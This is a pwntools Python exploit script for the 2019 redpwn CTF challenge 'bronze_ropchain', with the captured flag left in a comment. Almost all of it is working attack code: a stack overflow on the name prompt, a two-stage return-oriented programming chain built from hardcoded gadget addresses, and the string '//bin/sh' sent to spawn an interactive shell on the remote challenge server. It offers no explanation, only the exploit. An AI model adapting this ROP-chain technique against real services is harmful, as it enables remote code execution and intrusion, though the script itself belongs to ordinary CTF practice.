from pwn import *
#p = process('./bronze_ropchain')
p = remote("chall.2019.redpwn.net", 4004)
#gdb.attach(p)
main = p32(0x080488ea)
dec_eax = p32(0x08062f23)
mov_al = p32(0x0808446e)
int_x = p32(0x080939e3)
xor_eax = p32(0x080565a0)
pop_eax = p32(0x080a8e86)
pop_edx = p32(0x0806ef2b)
pop_ebx = p32(0x080481c9)
pop_eax_d_c = p32(0x080564b4)
pop_edi = p32(0x08049b2b)
xor_ecx_int = p32(0x0806f2f1)
fgets = p32(0x8050030)
free_list = p32(0x80db8a8)
pop_b_d = p32(0x0806ef2a)
inc_dx = p32(0x0805e215) 
inc_bx = p32(0x0805e40b)
pop_cb_x = p32(0x0806ef52)
pop_esp = p32(0x0809e1b1)
rop_addr = p32(0x806ef52)
ret = p32(0x080481b2)
int_ret = p32(0x0806f85f)
mov_eax_8 = p32(0x08092e00)
inc_ax = p32(0x080ca87d)
mov_dx_f = p32(0x08057245)
inc_dx = p32(0x08095c47)
nxt = p32(0x80db8a8+0x8)

p.recvuntil('What is your name?\n')
#exp = "a"*0x18 + "b"*0x4 + mov_al + (dec_eax)*0x78 + pop_ebx + "//sh" + int_x + p32(0x400)
exp = 'a'*0x18 + 'b'*0x4 + pop_cb_x + free_list + p32(0xffffffff)+pop_b_d + p32(0xffffffff) + p32(0x11111111) + inc_bx + int_ret + pop_esp + nxt
exp_rop =  mov_eax_8 + inc_ax*4 + pop_ebx + free_list + mov_dx_f + inc_dx + xor_ecx_int
p.sendline(exp)
print(p.recvline())
print(p.recvline())
p.send("\x03")
p.send("//bin/sh")
p.send(exp_rop)
print("check")
#flag{I've_n3v3r_he4rd_th4t_nam3_b3fore._Are_u_f0reign?}
#

p.interactive()
